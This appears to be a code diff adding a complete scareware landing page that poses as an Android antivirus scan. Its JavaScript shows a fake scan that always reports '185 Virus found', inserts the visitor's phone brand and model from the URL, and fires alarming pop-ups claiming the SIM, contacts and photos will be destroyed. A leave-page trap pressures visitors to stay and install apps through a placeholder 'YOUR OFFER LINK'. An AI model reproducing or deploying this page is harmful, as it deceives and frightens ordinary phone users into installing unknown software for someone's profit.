@@ -1,0 +1,109 @@
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en"><head>
+<title>Anti Virus Android</title>
+
+<script src="http://code.jquery.com/jquery-1.5.min.js" type="text/javascript"></script>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<meta name="robots" content="noindex,nofollow">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>
+			$(document).ready(function()
+			{
+				window.scrollTo(0, 1);
+				values = [
+					{"percent" : "0", "text" : "Loading..."},
+					{"percent" : "11", "text" : "Scanning your phone"},
+					{"percent" : "35", "text" : "185 Virus found"},
+					{"percent" : "63", "text" : "Processing"},
+					{"percent" : "81", "text" : "Processing..."},
+					{"percent" : "100", "text" : "Scanning Completed"}
+				];
+
+				var i = 0;
+				var intId = setInterval(updateStatusBar,2000);
+				function updateStatusBar()
+				{
+					if (i < values.length-1)
+					{
+						i++;
+						$(".progress-bar-color").css({width: parseInt(values[i].percent)+'%'});
+						$('.status-percent').html(values[i].percent + '%');
+						$('.status-text').html(values[i].text);
+					}
+					else
+					{
+						clearInterval(intId);
+						$('.status-percent').css('visibility', 'hidden');
+						$('.status-text').html('185 Virus Found!').css('text-align', 'center').fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300, function(){
+					
+    if (window.confirm('WARNING!\n\n185 dangerous virus found in ' + (getURLParameter('brand') + (' ') + getURLParameter('model')) + 'This Phone!\n\nContinue to install  "Antivirus App"  free on Google Playstore and Remove virus Now!')) {
+        window.location.href='http://google.com';
+    } 	
+							$('.status-text').html('<span style="color:#f00;font-weight:bold">Your phone is not protected and in DANGER!').fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300).fadeOut(300).fadeIn(300) 
+						});
+						$('.progress-bar').addClass('progress-bar-red');
+					}
+				}
+			});
+		</script>
+<script>
+function getURLParameter(name) {
+    return decodeURI(
+        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search)||[,null])[1] || ''
+    );
+}
+</script>
+<style>*{padding:0;margin:0;}body{font-family:Arial,Helvetica,sans-serif;background:#999999;min-height:1000px;}h1{display:block;border-bottom:3px solid #00aeef;padding-top:5px;height:55px;margin-bottom:10px;background:#d4ecf7;background:-moz-linear-gradient(top,#d4ecf7 0%,#93cee9 100%);background:-webkit-gradient(linear,left top,left bottom,color-stop(0%,#d4ecf7),color-stop(100%,#93cee9));background:-webkit-linear-gradient(top,#d4ecf7 0%,#93cee9 100%);background:-o-linear-gradient(top,#d4ecf7 0%,#93cee9 100%);background:-ms-linear-gradient(top,#d4ecf7 0%,#93cee9 100%);background:linear-gradient(top,#d4ecf7 0%,#93cee9 100%);height:69px;border-bottom:1px solid #618a9d}h1>span{width:310px;margin:auto;display:block;text-shadow:0 1px 0 #000;padding:5px;color:white;font-size:20px;font-weight:normal;line-height:30px;text-align:center;}h1 span img{vertical-align:middle;position:relative;bottom:2px;}.wrapper{width:330px;margin:auto;margin-top:20px;background:#CCC;border-radius:5px 5px 0px 0px;-moz-border-radius:5px 5px 0px 0px;-webkit-border-radius:5px 5px 0px 0px;border:0px;padding:0px;border:3px solid #FFF;}.wrapper-fix{background:#3481e0;}.wrapper-fix .info{background:#dbe7f6;font-size:small;padding:8px;border-bottom:1px solid #3481e0;}.wrapper-repair{background:#74a42d;}#overlay{position:fixed;top:0;left:0;width:100%;height:2000px;background:url("");z-index:9;}.fix .req{color:#ff0000;}.fix input[type="text"]{width:252px;border:1px solid #000;padding:5px;margin:5px 0;font-weight:bold;}.fix input[type="submit"]{background:#8baa30;border:1px solid #556e0a;color:#fff;padding:5px 20px;}h2{color:#fff;font-size:19px;font-weight:normal;padding:10px 0 10px 15px;}h2 strong{display:block;}h2 img,h2 .sprite{float:left;margin-right:10px;}.inner{background:#CCC;padding:0 12px 12px 12px;line-height:19px;font-size:17px;margin-top:15px;}.progress-bar{display:block;border:1px solid #a2a2a2;height:24px;padding:3px;margin-top:5px;}.progress-bar .progress-bar-color{background:#a0cf39;display:block;height:24px;width:0%;}.progress-bar-red{padding:0;height:30px;border:1px solid #d4d386;}.progress-bar-red .progress-bar-color{background:#f1f1d7;height:30px;width:100%;}.progress-bar-green{padding:0;height:30px;border:1px solid #5f5f5f;}.progress-bar-green .progress-bar-color{background:#76a52f;height:30px;width:100%;}.progress{position:relative;}.progress .status-text{position:absolute;top:7px;left:8px;width:240px;}.progress .status-percent{position:absolute;top:0px;right:0px;background:#ff9c00;color:#fff;height:32px;line-height:32px;width:50px;text-align:center;}.errors{border:1px solid #db2222;margin:5px 0;}.errors h3{background:#eee;padding:5px;font-size:small;}.errors ul{list-style:none;margin:8px;}.bwrap{width:250px;margin:auto;margin-top:10px;text-align:center;}.bwrap .button{float:right;text-decoration:none;width:96px;padding:0 10px;height:35px;line-height:35px;font-size:small;}.bwrap .button:first-child{float:left;}.bwrap .button-fix{border:1px solid #f3f763;background:#8baa30;color:#fff;font-weight:bold;}.bwrap .button-no{border:1px solid #555;background:#333;color:#666;}.gplay{margin:0 auto;background:#96aa39;}.button{color:#FFFFFF;padding:10px;text-align:center;text-decoration:none;border:1px solid #34740e;-webkit-border-radius:8px;-moz-border-radius:8px;border-radius:8px;font-size:16px;font-family:arial,helvetica,sans-serif;padding:10px 50px 10px 50px;text-shadow:-1px -1px 0 rgba(0,0,0,0.3);font-weight:bold;color:#FFFFFF;background-color:#4ba614;background-image:-webkit-gradient(linear,left top,left bottom,from(#4ba614),to(#008c00));background-image:-webkit-linear-gradient(top,#4ba614,#008c00);background-image:-moz-linear-gradient(top,#4ba614,#008c00);background-image:-ms-linear-gradient(top,#4ba614,#008c00);background-image:-o-linear-gradient(top,#4ba614,#008c00);background-image:linear-gradient(to bottom,#4ba614,#008c00);filter:progid:DXImageTransform.Microsoft.gradient(GradientType=0,startColorstr=#4ba614,endColorstr=#008c00);}.buttontext{text-decoration:none;}.bodyContent{font-family:Verdana,Geneva,sans-serif;font-size:14px;padding:10px 0 20px 15px;}.androidimg{display:block;text-align:center;margin-top:10px;}</style>
+</head><body>
+<div class="wrapper wrapper1">
+<div class="gplay"><h2><img src="http://dayflier.com/images/ajax-loader1.gif" alt="" style="padding-top: 2px;" height="32" width="32"/><noscript><img src="http://dayflier.com/images/ajax-loader1.gif" alt="" style="padding-top: 2px;" height="32" width="32"/></noscript><strong>Virus Scanning is in Progress:</strong>Medium Virus Checking...</h2></div>
+<div class="androidimg" ><img src="https://lh3.googleusercontent.com/-TeKtUmpi__8/AAAAAAAAAAI/AAAAAAAACvo/7e-FZNqYDU8/photo.jpg"/ height="32" width="32">
+</div>
+<div class="inner"><strong>Wait while we scan <script>document.write(getURLParameter('brand') + (' ') + getURLParameter('model'))
+    </script> your device:</strong>
+<div class="progress">
+<div class="progress-bar">
+</div>
+<span class="status-text">Loading...</span>
+<div class="status-percent"><strong>0%</strong></div>
+</div>
+</div>
+<div class="bodyContent">
+<strong><script>document.write(getURLParameter('brand') + (' ') + getURLParameter('model'))</script></strong>Dangerous <span style="color:#f00;font-weight:bold;">Virus Detected.</span>. This will damage and destroy your SIM card, contacts, photos, your applications and so on.
+</div>
+<a class="buttontext" href="YOUR OFFER LINK"><div class="button">
+Get rid of<script>document.write(getURLParameter('brand') + (' ') + getURLParameter('model'))
+    </script> viruses now.
+</div></a>
+</div>
+<script>
+alert("!!! WARNING!!!\n\n" + (getURLParameter('brand')) + " " + (getURLParameter('model')) + " Your device is infected dangerously! \n\nPress OK to scan your phone now");
+</script>
+</body></html>
+<script language="javascript">
+(function() {
+    setTimeout(function() {
+    var __redirect_to = 'http://google.com';//
+
+    var _tags = ['button', 'input', 'a'], _els, _i, _i2;
+    for(_i in _tags) {
+        _els = document.getElementsByTagName(_tags[_i]);
+        for(_i2 in _els) {
+            if((_tags[_i] == 'input' && _els[_i2].type != 'button' && _els[_i2].type != 'submit' && _els[_i2].type != 'image') || _els[_i2].target == '_blank') continue;
+            _els[_i2].onclick = function() {window.onbeforeunload = function(){};}
+        }
+   }
+
+    window.onbeforeunload = function() {
+        setTimeout(function() {
+            window.onbeforeunload = function() {};
+            setTimeout(function() {
+                document.location.href = __redirect_to;
+            }, 500);
+        },5);
+        return  'WARNING! Your phone is in danger and unprotected!\n\nDo not close this window because it can eliminate the data Contacts, Photos, Videos and your phone will be damaged and corrupt\n\nClick "Stay on this page" and Install Applications recommended - FREE FOR TODAY ONLY!';
+    }
+    }, 500);
+})();
+</script>
